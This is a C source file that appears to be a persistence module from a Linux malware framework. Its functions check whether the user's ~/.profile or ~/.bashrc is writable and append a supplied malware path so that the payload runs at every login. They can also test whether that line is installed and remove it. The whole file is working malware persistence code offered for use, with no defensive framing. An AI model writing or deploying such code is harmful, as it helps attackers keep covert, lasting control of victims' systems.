#pragma region RequiredLibraries

	#include <stdio.h>
	#include <stdlib.h>
	#include <string.h>
	#include "../../headers/modules/module.h"
	#include "../../headers/helpers/helpers.h"
	#include "../../headers/errors.h"

#pragma endregion

#pragma region Configuration

	#define        CHECKED_FILES_COUNT               2
	#define        PROFILE_PATH                      ".profile"
	#define        BASH_RC                           ".bashrc"

	#define        RUN_COMMAND_FORMAT                "%s\n"

#pragma endregion

#pragma region GlobalVariables

	char *checked_files[CHECKED_FILES_COUNT];
	char *home_path = NULL;
	int exploitable_file_index = -1;

#pragma endregion

#pragma region SharedObjectEvents

void __attribute__ ((constructor)) on_dlopen(void){

	get_user_home_directory(&home_path);

	// Generate all checked files
	concat_path_with_filename(checked_files + __COUNTER__, home_path, PROFILE_PATH);
	concat_path_with_filename(checked_files + __COUNTER__, home_path, BASH_RC);

}

void __attribute__ ((destructor)) on_dlclose(void){

	int i;

	free(home_path);
	for (i = 0; i < CHECKED_FILES_COUNT; i++){
		free(checked_files[i]);
	}

}

#pragma endregion

#pragma region ModuleMethods

extern int is_compatible(ENVIRONMENT *env){

	int i, ret_val;

	// If root, then the exploit can be executed
	if (env->is_root){
		exploitable_file_index = 0;
		return 1;
	}

	for (i = 0; i < CHECKED_FILES_COUNT; i++){

		// Check the privileges for the current file
		ret_val = has_privilege(checked_files[i], WRITE);
		if (ret_val >= 0){
			exploitable_file_index = i;
			break;
		}

	}

	// Return
	return ret_val;

}

extern int exploit(ENVIRONMENT *env){

	FILE *opened_file;

	// If the vulnerable file is not setted yet, set it
	if (exploitable_file_index == -1)
		is_compatible(env);

	// Apend the run command to file
	opened_file = fopen(checked_files[exploitable_file_index], "a");
	fprintf(opened_file, RUN_COMMAND_FORMAT, env->malware_path);
	fclose(opened_file);

	// Return
	return 0;

}

extern int is_installed(ENVIRONMENT *env){

	char *content = NULL;
	int ret_val = 0;

	// If the vulnerable file is not setted yet, set it
	if (exploitable_file_index == -1)
		is_compatible(env);

	if (get_file_content(checked_files[exploitable_file_index], &content) >= 0){

		// Check if the run command is present in file
		if (strstr(content, env->malware_path) != NULL){
			ret_val = 1;
		}

		free(content);
		content = NULL;

	}

	// Return
	return ret_val;

}

extern int delete_installed(ENVIRONMENT *env){

	char *content = NULL;

	// If the vulnerable file is not setted yet, set it
	if (exploitable_file_index == -1)
		is_compatible(env);

	if (get_file_content(checked_files[exploitable_file_index], &content) >= 0){

		// Remove all occurences of the run command from the file
		remove_all_substring_occurences(content, env->malware_path);
		create_file(checked_files[exploitable_file_index], content);

		free(content);
		content = NULL;

	}

	// Return
	return 0;

}

#pragma endregion